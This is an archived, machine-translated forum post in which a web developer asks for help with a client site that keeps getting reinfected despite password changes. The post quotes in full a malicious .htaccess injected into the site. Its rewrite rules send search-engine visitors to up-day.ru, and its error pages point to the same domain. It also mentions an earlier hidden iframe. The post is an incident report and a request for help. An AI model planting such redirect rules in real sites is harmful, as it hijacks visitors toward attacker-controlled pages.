<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>FTP site infection</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Good evening, dear habravchane! 

 I have an unpleasant situation. Made the site to the client. He is satisfied, the money received. 
 But a month lat...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>FTP site infection</h1><div class="post__text post__text-html js-mediator-article"> Good evening, dear habravchane! <br><br>  I have an unpleasant situation.  Made the site to the client.  He is satisfied, the money received. <br>  But a month later, I discovered that when entering the site Avira antivirus starts to curse.  Says that the page is infected with WebGen.  Browsing index.php found that at the end of the file is an iframe that downloads malicious code.  It seems to be a clear case - he treated the car (Avira, Avast then cureit!), Changed the password on the hosting.  The password did not tell anyone. <br><br><a name="habracut"></a>
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      A month has passed, and I discover a more interesting point: when I visit a client‚Äôs site, I‚Äôm being thrown to another site.  Immediately go to FTP.  Watching index.php not touched.  But .htaccess looks quite predictable: <br><br> <code><a href="http://up-day.ru/"></a> <a href="http://up-day.ru/"></a> <a href="http://up-day.ru/"></a> <a href="http://up-day.ru/"></a> <a href="http://up-day.ru/"></a> # HostRule <br> RewriteEngine On <br> RewriteCond %{HTTP_REFERER} .*google.*$ [NC,OR] <br> RewriteCond %{HTTP_REFERER} .*ask.*$ [NC,OR] <br> RewriteCond %{HTTP_REFERER} .*yahoo.*$ [NC,OR] <br> RewriteCond %{HTTP_REFERER} .*excite.*$ [NC,OR] <br> RewriteCond %{HTTP_REFERER} .*altavista.*$ [NC,OR] <br> RewriteCond %{HTTP_REFERER} .*msn.*$ [NC,OR] <br> RewriteCond %{HTTP_REFERER} .*netscape.*$ [NC,OR] <br> RewriteCond %{HTTP_REFERER} .*aol.*$ [NC,OR] <br> RewriteCond %{HTTP_REFERER} .*hotbot.*$ [NC,OR] <br> RewriteCond %{HTTP_REFERER} .*goto.*$ [NC,OR] <br> RewriteCond %{HTTP_REFERER} .*infoseek.*$ [NC,OR] <br> RewriteCond %{HTTP_REFERER} .*mamma.*$ [NC,OR] <br> RewriteCond %{HTTP_REFERER} .*alltheweb.*$ [NC,OR] <br> RewriteCond %{HTTP_REFERER} .*lycos.*$ [NC,OR] <br> RewriteCond %{HTTP_REFERER} .*search.*$ [NC,OR] <br> RewriteCond %{HTTP_REFERER} .*metacrawler.*$ [NC,OR] <br> RewriteCond %{HTTP_REFERER} .*yandex.*$ [NC,OR] <br> RewriteCond %{HTTP_REFERER} .*rambler.*$ [NC,OR] <br> RewriteCond %{HTTP_REFERER} .*mail.*$ [NC,OR] <br> RewriteCond %{HTTP_REFERER} .*dogpile.*$ [NC,OR] <br> RewriteCond %{HTTP_REFERER} .*ya.*$ [NC] <br> RewriteRule ^(.*)$ up-day.ru [R=301,L] <br> <br> ErrorDocument 401 up-day.ru <br> ErrorDocument 403 up-day.ru <br> ErrorDocument 404 up-day.ru <br> ErrorDocument 500 up-day.ru <br> # /HostRule <br></code> <br><br>  I fly a car (with the same antiviruses as listed above), change the password, upload the old .htaccess.  Everyone is happy.  But it was not there.  It takes less than 12 hours and I again observe the old picture.  Zamete, the password did not tell anyone.  I check the car - everything is clean.  Change password again, for the third time.  Less than half a day passes again and the site is infected.  The client is in a panic, trust is lost. <br><br>  But the problem is not solved.  Maybe someone faced with this kind of infection, or has thoughts on this matter? <br>  Perhaps I am not alone in this kind of problem? <br>  In any case, I am thankful in advance to everyone who responds to my request for help. <br><br>  PS Unsubscribed by the registrar up-day.ru.  Will it make sense? <br>  PPS Abuse replied that he only registered the name.  And what is needed to write to the hoster.  Wrote, wait. </div><p>Source: <a href="https://habr.com/ru/post/79687/">https://habr.com/ru/post/79687/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../79676/index.html">Well ... Japanese Urban ;-)</a></li>
<li><a href="../79677/index.html">Happy New Year!</a></li>
<li><a href="../79679/index.html">Work with data - ExtJS and Zend Framework, part 1</a></li>
<li><a href="../79682/index.html">Count the number of floors or the highest quality photo Burd Dubai</a></li>
<li><a href="../79683/index.html">Why prepayment is not the main thing</a></li>
<li><a href="../79688/index.html">Letter to Santa Claus</a></li>
<li><a href="../79690/index.html">JetBrains WebIDE - Suggestions and Suggestions</a></li>
<li><a href="../79693/index.html">became known price for Google Nexus One?</a></li>
<li><a href="../79695/index.html">I don't want to work in small studios anymore</a></li>
<li><a href="../79696/index.html">You calendar 2010</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>